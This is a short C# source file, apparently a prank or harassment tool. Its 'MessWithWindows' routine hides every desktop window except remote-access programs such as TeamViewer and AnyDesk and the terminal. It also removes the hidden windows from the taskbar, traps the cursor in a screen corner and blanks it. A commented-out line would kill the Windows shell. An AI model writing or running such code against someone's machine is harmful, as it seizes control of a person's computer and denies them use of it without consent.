using System;
using System.Collections.Generic;
using System.Diagnostics;

using System.Runtime.InteropServices;

namespace Moo;
internal static partial class FunnyStuff
{
	static readonly HashSet<string> whitelist = new() { "teamviewer", "teamviewer_desktop", "anydesk", "uv_x64", "UltraViewer_Desktop", "WindowsTerminal", "conhost" };

	[LibraryImport("user32.dll")]
	public static partial uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	public static void MessWithWindows()
	{
		//DwmExtendFrameIntoClientArea()
		WNDENUMPROC hide_window_callback = new(HideWindowAndOwner);
		BOOL windowsenumed = EnumWindows(hide_window_callback, (LPARAM)0);
		bool clipped = ClipCursor(App.ScreenBottomCorner());
		_ = SetCursor(null);
		//foreach (Process proc in Process.GetProcessesByName("explorer"))
		//	proc.Kill();
	}
	internal static BOOL HideWindowAndOwner(HWND hwnd, LPARAM lParam)
	{
		HWND owner_hwnd = GetWindow(hwnd, GET_WINDOW_CMD.GW_OWNER);
		uint owner_thread_id = GetWindowThreadProcessId((nint)owner_hwnd, out uint owner_id);
		Process owner_process = Process.GetProcessById((int)owner_id);
		uint thread_id = GetWindowThreadProcessId((nint)hwnd, out uint id);
		Process process = Process.GetProcessById((int)id);
		if ((Environment.ProcessId != owner_id) && !whitelist.Contains(process.ProcessName.ToLower()))
		{
			_ = ShowWindow(hwnd, SHOW_WINDOW_CMD.SW_HIDE);
			_ = ShowWindow(owner_hwnd, SHOW_WINDOW_CMD.SW_HIDE);
			_ = SetWindowLongPtr(hwnd, WINDOW_LONG_PTR_INDEX.GWL_EXSTYLE, (nint)WINDOW_EX_STYLE.WS_EX_TOOLWINDOW);
			_ = SetWindowLongPtr(owner_hwnd, WINDOW_LONG_PTR_INDEX.GWL_EXSTYLE, (nint)WINDOW_EX_STYLE.WS_EX_TOOLWINDOW);
		}
		return true;
	}
}
